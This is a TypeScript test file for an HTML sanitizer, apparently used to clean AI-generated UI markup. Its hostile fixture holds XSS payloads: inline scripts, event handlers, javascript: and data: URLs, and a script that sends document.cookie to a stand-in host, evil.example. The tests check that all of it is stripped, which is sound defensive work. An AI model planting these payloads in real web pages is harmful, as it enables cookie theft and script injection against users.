import { describe, expect, test } from "bun:test";
import { sanitizeHtml, validateScreen, unknownClassRate } from "../lib/agent/sanitize";

/** Phase B acceptance: "sanitizer strips a hostile fixture
 * (scripts/handlers) completely." */

const HOSTILE_FIXTURE = `\`\`\`html
<!doctype html>
<html>
<head>
  <title>evil</title>
  <link rel="stylesheet" href="https://evil.example/steal.css">
  <meta http-equiv="refresh" content="0;url=https://evil.example">
  <style>body { display: none; }</style>
  <script src="https://evil.example/x.js"></script>
</head>
<body>
<div class="shell shell-sidebar" onload="alert(1)">
  <script>fetch('https://evil.example/exfil?c='+document.cookie)</script>
  <aside class="sidebar">
    <a class="nav-item" href="javascript:alert(document.domain)">Home</a>
    <a class="nav-item" HREF=" JavaScript:void(0)">Sneaky</a>
    <img src="https://evil.example/pixel.gif" onerror="alert(2)">
    <iframe src="https://evil.example"></iframe>
    <object data="x"></object><embed src="x">
  </aside>
  <main class="page" style="background:url('https://evil.example/bg.png')">
    <h1 onclick='steal()' class="page-title">Overview</h1>
    <form action="https://evil.example/phish" method="post">
      <input class="input" onfocus=alert(3) value="x">
    </form>
    <a href="data:text/html,<script>alert(4)</script>">link</a>
    <div srcdoc="<script>alert(5)</script>" class="card">card</div>
  </main>
</div>
</body>
</html>
\`\`\``;

describe("sanitizeHtml", () => {
  const { html, removed, unknownClasses } = sanitizeHtml(HOSTILE_FIXTURE);

  test("strips every script, handler, and scriptable URL completely", () => {
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<\/script/i);
    expect(html).not.toMatch(/\son\w+\s*=/i);
    expect(html).not.toMatch(/javascript\s*:/i);
    expect(html).not.toMatch(/data\s*:/i);
    expect(html).not.toMatch(/srcdoc/i);
    expect(html).not.toMatch(/<style/i);
    expect(html).not.toMatch(/<link/i);
    expect(html).not.toMatch(/<meta/i);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<object/i);
    expect(html).not.toMatch(/<embed/i);
    expect(html).not.toMatch(/style\s*=/i);
    expect(html).not.toMatch(/https?:\/\//i);
    expect(html).not.toMatch(/evil\.example/i);
  });

  test("unwraps fences and document chrome, keeps the fragment", () => {
    expect(html.startsWith('<div class="shell shell-sidebar"')).toBe(true);
    expect(html).not.toMatch(/<!doctype|<html|<head|<body/i);
    expect(html).toContain('class="page-title"');
    expect(removed).toContain("markdown fences");
    expect(removed).toContain("document wrapper");
    expect(removed).toContain("<script>");
    expect(removed).toContain("event handlers");
    expect(removed).toContain("style attributes");
  });

  test("keeps benign known-class markup untouched", () => {
    const clean = `<div class="shell shell-topnav">
  <header class="topnav"><div class="brand"><span class="brand-mark">A</span> Acme</div></header>
  <main class="page"><h1 class="page-title">Hi</h1>
    <svg class="chart-line" viewBox="0 0 100 40"><polyline class="line" points="0,30 100,8"></polyline></svg>
  </main>
</div>`;
    const r = sanitizeHtml(clean);
    expect(r.html).toBe(clean);
    expect(r.removed).toEqual([]);
    expect(r.unknownClasses).toEqual([]);
  });

  test("reports unknown classes without rejecting them", () => {
    const r = sanitizeHtml('<div class="shell shell-topnav"><main class="page glitter-panel">x</main></div>');
    expect(r.unknownClasses).toEqual(["glitter-panel"]);
    expect(r.html).toContain("glitter-panel");
  });

  test("hostile fixture: all remaining classes are known ds classes", () => {
    expect(unknownClasses).toEqual([]);
  });
});

describe("validateScreen", () => {
  test("accepts a real screen", () => {
    const ok = `<div class="shell shell-topnav"><header class="topnav"><div class="brand"><span class="brand-mark">A</span> Acme</div></header><main class="page"><header class="page-header"><div><h1 class="page-title">Overview</h1><p class="page-desc">Your week at a glance.</p></div></header><div class="card"><p class="stat-label">Revenue</p><p class="stat">$12,400</p></div></main></div>`;
    expect(validateScreen(ok)).toEqual([]);
  });

  test("rejects empty / non-shell / garbage output with complaints", () => {
    expect(validateScreen("").length).toBeGreaterThan(0);
    expect(validateScreen("I'm sorry, I can't help with that request right now, but here is an essay about design systems instead. ".repeat(5)).length).toBeGreaterThan(0);
    const soup = `<div class="shell shell-topnav"><main class="page">${'<div class="tw-flex tw-gap-4 tw-rounded-xl tw-bg-blue-500">x</div>'.repeat(20)}</main></div>`;
    expect(validateScreen(soup).some((c) => c.includes("class catalog"))).toBe(true);
  });

  test("unknownClassRate math", () => {
    expect(unknownClassRate('<div class="page page glitter"></div>')).toBeCloseTo(1 / 3);
    expect(unknownClassRate("<div>no classes</div>")).toBe(0);
  });
});
